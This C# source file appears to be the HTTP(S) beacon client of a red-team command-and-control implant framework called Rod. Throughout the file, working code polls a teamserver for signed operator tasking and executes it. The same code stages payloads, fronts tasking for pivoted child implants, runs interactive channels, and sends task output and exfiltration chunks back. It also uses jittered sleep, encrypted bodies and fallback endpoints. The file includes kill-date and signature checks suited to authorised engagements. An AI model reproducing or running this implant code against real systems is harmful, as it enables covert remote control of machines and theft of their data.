using System.Buffers.Binary;
using System.Collections.Concurrent;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The reference implant's web check-in client (architecture.md Sec 8): the
// envelope POST cycle, the shape every mainstream HTTP(S) C2 uses. One POST
// to /implants/beacon is one poll check-in -- the request body carries the
// handshake frame first plus any results, exfil chunks, and staged demands
// collected since the last cycle; the response carries the handshake
// response, the staged chunk runs answering those demands, and queued tasking
// while the server's dispatch budget lasts. Authentication is at the
// application layer: when the bake carried a per-artifact key, every body
// (request and response) seals under it as AES-256-GCM ciphertext covering a
// fresh counter, so the web transports need no TLS client certificate
// anywhere and the cleartext-http posture carries confidential content, not
// just authenticated content. Over https the teamserver CA is pinned as the
// server identity and the enrolled leaf stays available for a front that
// does ask (an mTLS front); the lab-debug bake (no key) sends the plaintext
// framed body. The wire grammar is the envelope check-in contract
// (extending/implants.md); nothing here is implant-only tradecraft, the same
// frames the gRPC stream carries in a different carriage.

/// <summary>
/// Runs the implant's check-in lifecycle over the envelope POST cycle: POST
/// the accumulated frames, process the response's tasking, sleep the baked
/// interval with jitter, repeat. Channel verbs never arrive over the envelope
/// (the server will not claim them without a live stream), so -- exactly like
/// the gRPC stream's poll mode -- a channel task, should one ever arrive, is
/// refused on the task itself. Tasking keeps its signature and replay-nonce
/// discipline regardless of transport (architecture.md Sec 9).
/// </summary>
internal sealed class EnvelopeBeacon : ICheckInClient
{
    /// <summary>
    /// The envelope check-in route. Mapped on every web listener beside the
    /// enroll route; fixed, not malleable (the malleable profile shapes the
    /// enroll request; URI routing at the public endpoint is a redirector
    /// concern).
    /// </summary>
    public const string Route = "/implants/beacon";

    /// <summary>
    /// The handshake capability a degraded-channels bake advertises
    /// (architecture.md Sec 10.3): "this artifact accepts channel traffic
    /// over its poll check-ins." The teamserver's degraded hub parks
    /// operator input against the advertising session and delivers it on
    /// its cycles.
    /// </summary>
    internal const string DegradedCapability = "channels.poll";

    private readonly EgressEndpoints _egress;
    private readonly string _implantId;
    private readonly X509Certificate2 _leaf;
    private readonly IReadOnlyList<X509Certificate2> _cas;
    private readonly X509Certificate2Collection _pinned;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly HandlerRegistry _handlers;
    private readonly IReadOnlyList<string> _classVerbs;
    private readonly TextWriter _log;

    // The live cadence (runtime-retunable through beacon.sleep); null keeps
    // the baked sleep/jitter pair, the pre-cadence shape tests construct.
    private readonly Cadence? _cadence;

    // The fronted-pivot ledger (architecture.md Sec 5.2), shared with the
    // gRPC beacon through the one EnrollBundle the program hands both: the
    // Pivot children this implant enrolled, whose tasking a check-in executes.
    private readonly FrontedPivots? _fronted;

    // The replay-nonce state (architecture.md Sec 9), shared with the gRPC
    // beacon: the accepted-nonce floor spans the implant's whole run, so a
    // captured frame replayed after a transport switch still falls at or
    // below it.
    private readonly TaskNonceTracker _nonces;

    // Upstream frames waiting for the next POST: task results, exfil chunks,
    // and staged demands produced by earlier responses. Cleared only after a
    // response is processed -- a failed POST re-sends the batch whole, and
    // the server treats a retransmitted result for an already-completed task
    // as a no-op, so a partial failure never loses or double-records a result.
    private readonly List<Frame> _upstream = new();

    // The staged tasks whose StagedPull frames ride _upstream, in demand
    // order: the response answers each demand with its chunk run before any
    // new tasking, so this list is the key to reading the response back.
    private readonly List<string> _demands = new();

    // The staged tasks awaiting their chunk run, keyed by task id: a task
    // accepted in one response is demanded on the next request and dispatches
    // when its terminal chunk arrives.
    private readonly Dictionary<string, TaskRequest> _stagedAwaiting = new();

    // The per-artifact check-in seal (architecture.md Sec 8/9): the baked key
    // split into its id and key halves, present only when the bake asked for
    // sealed check-ins. Every body this client exchanges then rides as
    // AES-256-GCM ciphertext under it.
    private readonly (byte[] KeyId, byte[] Key)? _seal;

    // The check-in counter: incremented before every POST attempt, so a
    // retransmitted batch after a lost response still carries a fresh value
    // (the server refuses a counter at or below its floor) while the batch
    // semantics below make the retransmission itself idempotent.
    private long _checkInCounter;

    // The check-in mode this client serves: the web URL shape splits by it
    // (architecture.md Sec 8) -- poll runs this POST cycle, stream holds the
    // WebSocket stream (WsBeacon). Defaults to poll, the shape this client
    // has always been.
    private readonly string _mode;

    // The degraded-channel opt-in (architecture.md Sec 10.3): when the bake
    // carried it, the interactive verbs claim over this cycle's own bodies.
    private readonly bool _degradedChannels;

    // The live channels a degraded bake holds across cycles, keyed by task
    // id: the handler runs in the background for as long as the channel
    // lasts, its output batching into the upstream like any other frame and
    // its input arriving as ChannelInput frames on later responses.
    private readonly ConcurrentDictionary<string, BeaconLiveChannel> _liveChannels = new();

    // Ends every live channel when the run ends: the token releases the
    // handlers (their processes are killed and their pumps unwind), the
    // delivery waits keep the last upstream writes accounted.
    private readonly CancellationTokenSource _channelsGone = new();

    // Serializes the upstream batch between the cycle thread (snapshot,
    // delivered-frame removal) and every background channel's output writes.
    private readonly object _upstreamGate = new();

    public EnvelopeBeacon(
        EgressEndpoints egress,
        string implantId,
        X509Certificate2 leaf,
        IReadOnlyList<X509Certificate2> cas,
        TimeSpan sleep,
        TimeSpan jitter,
        DateTimeOffset? killDate,
        EnrollBundle? enroll,
        IReadOnlyList<string> classVerbs,
        TextWriter log,
        TaskNonceTracker? nonces = null,
        TransportProfile? transport = null,
        Cadence? cadence = null,
        string mode = BeaconModes.Poll,
        bool degradedChannels = false)
    {
        _egress = egress;
        _implantId = implantId;
        _leaf = leaf;
        _cas = cas;
        _pinned = new X509Certificate2Collection();
        foreach (var ca in cas)
            _pinned.Add(ca);
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        // The cadence rides into the registry so beacon.sleep retunes this
        // run, whichever client carries it.
        _handlers = HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers);
        _cadence = cadence;
        _fronted = enroll?.Fronted;
        _classVerbs = classVerbs;
        _log = log;
        _nonces = nonces ?? new TaskNonceTracker();
        _seal = transport is { SealsCheckIns: true }
            ? ParseBakedKey(transport.EnvelopeKey)
            : null;
        _mode = mode;
        _degradedChannels = degradedChannels;
    }

    /// <summary>
    /// This client carries the web URL shape on a poll-mode bake
    /// (architecture.md Sec 8): a beacon URL naming an http(s) front runs
    /// this POST cycle when the profile polls; a stream-mode web URL belongs
    /// to the WebSocket stream client instead, and a bare host:port (the
    /// mTLS listener dial shape) to the gRPC stream client.
    /// </summary>
    public bool Serves(string beaconUrl)
        => BeaconUrl.IsWeb(beaconUrl) && _mode != BeaconModes.Stream;

    /// <summary>
    /// Composes the check-in URL off a beacon URL: the scheme and authority
    /// it names plus the fixed route, with any path the entry carried
    /// dropped.
    /// </summary>
    public static string CheckInUrl(string beaconUrl)
    {
        var u = beaconUrl.Trim();
        var schemeIdx = u.IndexOf("://", StringComparison.Ordinal);
        var rest = schemeIdx < 0 ? u : u[(schemeIdx + 3)..];
        var slash = rest.IndexOf('/');
        var authority = slash < 0 ? rest : rest[..slash];
        var scheme = schemeIdx < 0 ? "https" : u[..schemeIdx];
        return $"{scheme}://{authority}{Route}";
    }

    /// <summary>
    /// Blocks until cancellation, the kill date passing, or a permanent
    /// handshake refusal. A dropped cycle (transport failure, refused body)
    /// walks the egress entry and retries on the jittered cadence with the
    /// same exponential backoff the gRPC stream applies. Returns
    /// <see cref="CheckInExit.SwitchTransport"/> when the walk's current
    /// entry is not a web URL, so the coordinator hands the run to the gRPC
    /// stream client.
    /// </summary>
    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
    {
        try
        {
            return await RunCyclesAsync(cancellationToken);
        }
        finally
        {
            // The run is ending: the channels are run-scoped, so they end
            // with it -- the token releases the handlers, and the delivery
            // waits keep the last upstream writes accounted before the
            // coordinator moves on.
            _channelsGone.Cancel();
            foreach (var live in _liveChannels.Values)
                live.CompleteInput();
            await Task.WhenAll(_liveChannels.Values.Select(c => c.Delivery));
        }
    }

    private async Task<CheckInExit> RunCyclesAsync(CancellationToken cancellationToken)
    {
        var consecutiveFailures = 0;
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return CheckInExit.Terminate;
            }
            if (!BeaconUrl.IsWeb(_egress.CurrentBeaconUrl))
                return CheckInExit.SwitchTransport;

            var cycle = BeaconCycleResult.Dropped;
            try
            {
                cycle = await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception ex)
            {
                _log.WriteLine($"beacon check-in failed: {ex.Message}");
            }

            // Every non-OK handshake status (unknown implant, kill date
            // expired, retired, identity/version mismatch) is permanent for
            // this artifact: retrying would not change the answer.
            if (cycle == BeaconCycleResult.Terminal)
                return CheckInExit.Terminate;

            if (cycle == BeaconCycleResult.Handshaken)
            {
                consecutiveFailures = 0;
            }
            else
            {
                consecutiveFailures++;
                // The egress walk (architecture.md Sec 8): a cycle that never
                // reached a handshake means the current front is not
                // answering, so the next attempt dials the next entry.
                var from = _egress.CurrentBeaconUrl;
                _egress.Advance();
                if (from != _egress.CurrentBeaconUrl)
                    _log.WriteLine($"beacon endpoint {from} failed; walking to {_egress.CurrentBeaconUrl}");
            }
            try
            {
                // The cadence is read fresh every cycle, so a beacon.sleep
                // change lands on the very next sleep.
                var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return CheckInExit.Terminate;
            }
        }
        return CheckInExit.Terminate;
    }

    // What one POST-response cycle produced, driving the retry policy in
    // RunAsync. Mirrors the gRPC beacon's cycle result.
    private enum BeaconCycleResult
    {
        // The POST failed or the response was unusable; retry.
        Dropped,

        // The handshake succeeded and the response was processed.
        Handshaken,

        // The server refused the handshake permanently; terminate.
        Terminal,
    }

    // One POST-response cycle. Throws on transport errors (the caller logs
    // and retries); a refused handshake returns Terminal. The envelope's
    // documented bounds apply to the batch (an artifact's exfil chunk run
    // must begin and end inside one request body, extending/implants.md), so
    // results accumulate here in frame batches rather than streaming.
    private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
    {
        var url = CheckInUrl(_egress.CurrentBeaconUrl);
        using var http = BuildClient(url);

        // The batch snapshot: the handshake plus everything accumulated. The
        // demand order rides the request, and the delivered frames clear only
        // after the response is processed -- and only the delivered ones, so
        // a background channel's output added mid-cycle is not lost -- and a
        // failed POST re-sends the batch whole.
        var demandOrder = _demands.ToList();
        List<Frame> pending;
        lock (_upstreamGate)
        {
            pending = new List<Frame>(_upstream);
        }
        var frames = new List<Frame>(1 + pending.Count) { HandshakeFrame() };
        frames.AddRange(pending);

        // The sealed body (the default build shape): the framed bytes behind
        // a fresh big-endian counter, all AES-256-GCM under the baked
        // per-artifact key. The counter burns on every attempt, not every
        // delivery, so the retransmission above never trips the server's
        // replay floor. The plaintext lab bake posts the frames as-is.
        var encoded = EnvelopeCodec.Encode(frames);
        byte[] postBody;
        string contentType;
        if (_seal is { } seal)
        {
            var plaintext = new byte[CounterBytes + encoded.Length];
            BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_checkInCounter);
            encoded.AsSpan().CopyTo(plaintext.AsSpan(CounterBytes));
            postBody = SealCheckInBody(plaintext, seal.KeyId, seal.Key, CheckInRequestAad);
            contentType = "text/plain";
        }
        else
        {
            postBody = encoded;
            contentType = "application/octet-stream";
        }

        using var content = new ByteArrayContent(postBody);
        content.Headers.ContentType = new MediaTypeHeaderValue(contentType);
        using var response = await http.PostAsync(url, content, cancellationToken);
        response.EnsureSuccessStatusCode();

        var responseBytes = await response.Content.ReadAsByteArrayAsync(cancellationToken);
        if (_seal is { } open)
        {
            // A sealed cycle answers sealed: a body that does not verify
            // under the key this artifact carries is a dropped cycle, not a
            // parse -- nothing inside it is acted on.
            responseBytes = TryOpenCheckInBody(responseBytes, open.KeyId, open.Key, CheckInResponseAad)
                ?? throw new InvalidOperationException("check-in response did not verify under the baked key");
        }

        var inbound = EnvelopeCodec.Parse(responseBytes);
        if (inbound.Count == 0)
            throw new InvalidOperationException("check-in response carried no frames");

        var handshake = HandshakeResponse.Parser.ParseFrom(inbound[0].Payload);
        if (handshake.Status != HandshakeStatus.Ok)
        {
            _log.WriteLine($"handshake refused: {handshake.Status}; terminating");
            return BeaconCycleResult.Terminal;
        }
        _nonces.Negotiated = handshake.ReplayNonces;
        _log.WriteLine($"handshake ok: engagement={handshake.EngagementId}, replay-nonces={handshake.ReplayNonces}");

        lock (_upstreamGate)
        {
            foreach (var delivered in pending)
                _upstream.Remove(delivered);
        }
        _demands.Clear();
        ProcessResponse(inbound, demandOrder);
        return BeaconCycleResult.Handshaken;
    }

    // Reads a response body past its handshake: the staged chunk runs in
    // demand order (the server answers demands before new tasking), then the
    // queued TaskRequests. Defensive throughout -- a frame that does not
    // match the contract is logged and skipped, never thrown, because the
    // batch semantics above make an exception cost the whole accumulated
    // upstream run.
    private void ProcessResponse(IReadOnlyList<Frame> inbound, IReadOnlyList<string> demandOrder)
    {
        var index = 1;

        // The staged half: each demand's chunk run, terminal-flagged. A run
        // that never terminates, carries a foreign task id, or answers a
        // demand this cycle did not send is a protocol break -- report the
        // staged task Failed and move on.
        foreach (var demand in demandOrder)
        {
            var parts = new List<byte[]>();
            var total = 0;
            var terminal = false;
            while (index < inbound.Count && !terminal)
            {
                StagedChunk chunk;
                try
                {
                    chunk = StagedChunk.Parser.ParseFrom(inbound[index].Payload);
                }
                catch (Google.Protobuf.InvalidProtocolBufferException)
                {
                    break;
                }
                if (chunk.TaskId != demand)
                    break;
                index++;
                parts.Add(chunk.Data.ToArray());
                total += chunk.Data.Length;
                terminal = chunk.Terminal;
            }

            if (!_stagedAwaiting.Remove(demand, out var task))
                continue;
            if (!terminal)
            {
                _log.WriteLine($"task {demand}: staged chunk run ended without a terminal chunk");
                AddUpstream(ResultFrame(task, TaskOutcome.Failed,
                    "staged payload stream ended without a terminal chunk"));
                continue;
            }

            var payload = new byte[total];
            var offset = 0;
            foreach (var part in parts)
            {
                part.CopyTo(payload, offset);
                offset += part.Length;
            }
            var (outcome, output) = _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
            AddUpstream(ResultFrame(task, outcome, output));
        }

        // The tasking half: every remaining frame is a TaskRequest, or --
        // under the degraded opt-in -- a ChannelInput frame the server's
        // parking hub delivered for a live channel of this cycle.
        for (; index < inbound.Count; index++)
        {
            var frame = inbound[index];
            if (frame.Kind == FrameKind.ChannelInput)
            {
                RouteChannelInput(frame);
                continue;
            }

            TaskRequest task;
            try
            {
                task = TaskRequest.Parser.ParseFrom(frame.Payload);
            }
            catch (Google.Protobuf.InvalidProtocolBufferException)
            {
                _log.WriteLine("response frame was neither a staged chunk nor tasking; skipped");
                continue;
            }
            AcceptTasking(task);
        }
    }

    // One dispatched TaskRequest: verify the signature (and nonce) exactly as
    // the stream does, then dispatch inline, demand the staged payload, or
    // refuse the channel shape. The result (and any exfil chunks) queue for
    // the next POST -- the poll cycle reports on the check-in after the one
    // that carried the tasking.
    private void AcceptTasking(TaskRequest task)
    {
        // Fronted tasking (architecture.md Sec 5.2): a frame marked with
        // another implant's id is a Pivot child's tasking this check-in
        // executes on the child's behalf. The gate is the fronted ledger:
        // only a child this implant enrolled is frontable.
        var targetId = _implantId;
        var fronted = false;
        if (task.HasTargetImplantId && task.TargetImplantId.Length > 0 && task.TargetImplantId != _implantId)
        {
            targetId = task.TargetImplantId;
            fronted = true;
            if (_fronted is null || !_fronted.Knows(targetId))
            {
                _log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
                AddUpstream(ResultFrame(task, TaskOutcome.Failed,
                    $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed"));
                return;
            }
        }

        // Command signing (architecture.md Sec 9): verify before anything
        // runs, nonce floor included. The signed tuple's implant id is the
        // target's own, and the nonce arm follows the target too -- a pivot
        // child never handshakes, so its tasking keeps the nonce-less shape.
        var verdict = TaskingVerifier.Verify(targetId, task, _cas, fronted ? new TaskNonceTracker() : _nonces);
        if (verdict != TaskingVerdict.Accepted)
        {
            var cause = verdict switch
            {
                TaskingVerdict.RejectedReplay =>
                    $"task rejected: replayed tasking (nonce {task.TaskNonce} at or below the accepted floor); not executed",
                TaskingVerdict.RejectedNoNonce =>
                    "task rejected: no task nonce after the replay-nonce handshake; not executed",
                _ => "task rejected: signature verification failed; not executed",
            };
            _log.WriteLine($"task {task.TaskId} rejected: {verdict}");
            AddUpstream(ResultFrame(task, TaskOutcome.Failed, cause));
            return;
        }

        // The streaming shape over the poll cycle: under the degraded
        // opt-in the channel handler runs in the background, its output
        // batching into the upstream like any other frame and its input
        // arriving as ChannelInput frames on later responses; without the
        // opt-in the server never claims the verb, so reaching here without
        // it is a protocol break -- refuse it on the task.
        if (_handlers.ChannelFor(task.Verb) is { } channelHandler)
        {
            if (!_degradedChannels)
            {
                _log.WriteLine($"task {task.TaskId} refused: no channel on an envelope check-in");
                AddUpstream(ResultFrame(task, TaskOutcome.Failed,
                    $"{task.Verb} requires a stream-mode check-in or the degraded-channels bake; this cycle carries neither"));
                return;
            }
            StartPollChannel(task, channelHandler);
            return;
        }

        // The typed arm (architecture.md Sec 10): a staged task's bulk
        // payload is demanded on the next POST and dispatches when its chunk
        // run arrives.
        if (task.HasStagedBytes)
        {
            _stagedAwaiting[task.TaskId] = task;
            _demands.Add(task.TaskId);
            AddUpstream(new Frame
            {
                Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
                Kind = FrameKind.StagedPull,
            });
            return;
        }

        var (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
        AddUpstream(ResultFrame(task, outcome, output));
        // Out-of-band exfil chunks follow the TaskResult on the next POST,
        // each carrying the task id so the server reassembles into the
        // artifact store (architecture.md Sec 10.1 exfil, Sec 11).
        foreach (var chunk in chunks)
        {
            chunk.TaskId = task.TaskId;
            AddUpstream(new Frame
            {
                Payload = ByteString.CopyFrom(chunk.ToByteArray()),
                Kind = FrameKind.ExfilChunk,
            });
        }
    }

    private Frame HandshakeFrame()
    {
        // The implant speaks first on every POST: the handshake re-opens (or
        // reuses) the session and re-advertises the baked class verbs
        // intersected with the compiled handlers (architecture.md Sec 5.3).
        var handshake = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = _implantId,
            ReplayNonces = true,
        };
        handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
        // The degraded opt-in rides the advertisement: the server's parking
        // hub reads it off the session and claims the channel verbs against
        // this cycle only when it is there.
        if (_degradedChannels)
            handshake.Capabilities.Add(DegradedCapability);
        return new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) };
    }

    // Opens one channel for a dispatched streaming task and starts its
    // handler in the background: the cycle thread returns to its cadence
    // immediately, the channel's output batches into the upstream through
    // the shared live-channel write binding, and the delivery task reports
    // the handler's outcome as the task's final TaskResult on whatever
    // check-in carries it.
    private void StartPollChannel(TaskRequest task, CapabilityChannelHandler handler)
    {
        var channel = new BeaconLiveChannel(
            task.TaskId,
            (frame, ct) =>
            {
                AddUpstream(frame);
                return ValueTask.CompletedTask;
            });
        _liveChannels[task.TaskId] = channel;
        _log.WriteLine($"channel opened: task {task.TaskId} verb {task.Verb} (degraded, poll cadence)");
        channel.Delivery = DeliverPollChannelAsync(channel, task, handler);
    }

    // The channel's delivery: run the handler to its end, then queue its
    // outcome. A channel whose run ends under it reports nothing further --
    // the server-side timeout is the documented close for a channel the
    // cycles stopped carrying.
    private async Task DeliverPollChannelAsync(
        BeaconLiveChannel channel,
        TaskRequest task,
        CapabilityChannelHandler handler)
    {
        try
        {
            var (outcome, output) = await handler.Handle(task.Arguments, channel, _channelsGone.Token);
            AddUpstream(ResultFrame(task, outcome, output));
            _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
        }
        catch (OperationCanceledException)
        {
            // The run ended: the channel dies with it, documented.
        }
        catch (Exception ex)
        {
            _log.WriteLine($"channel ended without delivery: task {task.TaskId}: {ex.Message}");
        }
        finally
        {
            _liveChannels.TryRemove(task.TaskId, out _);
            channel.CompleteInput();
        }
    }

    // One ChannelInput frame off a response: operator input for a live
    // channel, routed by task id. Input for a task with no live channel is
    // dropped and logged -- a channel that already ended, or input that
    // raced the cycle.
    private void RouteChannelInput(Frame frame)
    {
        ChannelInput input;
        try
        {
            input = ChannelInput.Parser.ParseFrom(frame.Payload);
        }
        catch (Google.Protobuf.InvalidProtocolBufferException)
        {
            return;
        }

        if (_liveChannels.TryGetValue(input.TaskId, out var channel))
        {
            if (!channel.Receive(input.Data.ToArray(), input.Eof))
                _log.WriteLine($"channel input for task {input.TaskId} dropped: input queue full");
        }
        else
        {
            _log.WriteLine($"channel input for unknown task {input.TaskId} dropped");
        }
    }

    // One frame into the upstream batch, under the gate the background
    // channels' output writes share with the cycle thread's snapshot.
    private void AddUpstream(Frame frame)
    {
        lock (_upstreamGate)
        {
            _upstream.Add(frame);
        }
    }

    private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
        => new()
        {
            Payload = ByteString.CopyFrom(new TaskResult
            {
                TaskId = task.TaskId,
                Outcome = outcome,
                Output = output,
            }.ToByteArray()),
            Kind = FrameKind.TaskResult,
        };

    // The sealed check-in counter's size in bytes: an 8-byte big-endian
    // integer, the same width the teamserver's floor reads.
    private const int CounterBytes = 8;

    // The purpose tags binding each sealed body to its direction, the exact
    // strings the teamserver's AesGcmEnvelope carries: a sealed request can
    // never be reflected as a response and vice versa.
    private const string CheckInRequestAad = "rod-checkin-v1";
    private const string CheckInResponseAad = "rod-checkin-response-v1";

    // Splits the baked envelope key (standard base64 of keyId(16) || key(32))
    // into its halves. Delegates to the shared EnvelopeWire, the seal every
    // web client carries; internal for the unit tests, which pin the baked
    // key shape.
    internal static (byte[] KeyId, byte[] Key)? ParseBakedKey(string baked)
        => EnvelopeWire.ParseBakedKey(baked);

    // The sealed check-in wire shape, delegated to the shared EnvelopeWire.
    // Internal for the unit tests, which pin the sealed wire shape.
    internal static byte[] SealCheckInBody(ReadOnlySpan<byte> plaintext, byte[] keyId, byte[] key, string aad)
        => EnvelopeWire.SealCheckInBody(plaintext, keyId, key, aad);

    // Opens what SealCheckInBody sealed, delegated to the shared
    // EnvelopeWire. Internal for the unit tests, which pin the sealed wire
    // shape.
    internal static byte[]? TryOpenCheckInBody(byte[] body, byte[] keyId, byte[] key, string aad)
        => EnvelopeWire.TryOpenCheckInBody(body, keyId, key, aad);

    // One client per cycle, mirroring the gRPC beacon's per-cycle channel:
    // the walk's current entry decides the shape -- https pins the teamserver
    // CA as the server identity and keeps the enrolled leaf available for a
    // front that asks to see one (an mTLS front; a web https front never
    // asks, and the sealed body is the identity), http is the bare
    // cleartext client the plain web posture documents.
    private HttpClient BuildClient(string url)
    {
        SocketsHttpHandler handler;
        if (url.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
        {
            handler = new SocketsHttpHandler
            {
                SslOptions = new SslClientAuthenticationOptions
                {
                    ClientCertificates = new X509Certificate2Collection(_leaf),
                    RemoteCertificateValidationCallback = (_, cert, chain, _) =>
                        C2.PinServerChain(cert as X509Certificate2, chain, _pinned),
                },
            };
        }
        else
        {
            handler = new SocketsHttpHandler();
        }
        return new HttpClient(handler) { Timeout = TransportProfile.DefaultRequestTimeout };
    }
}
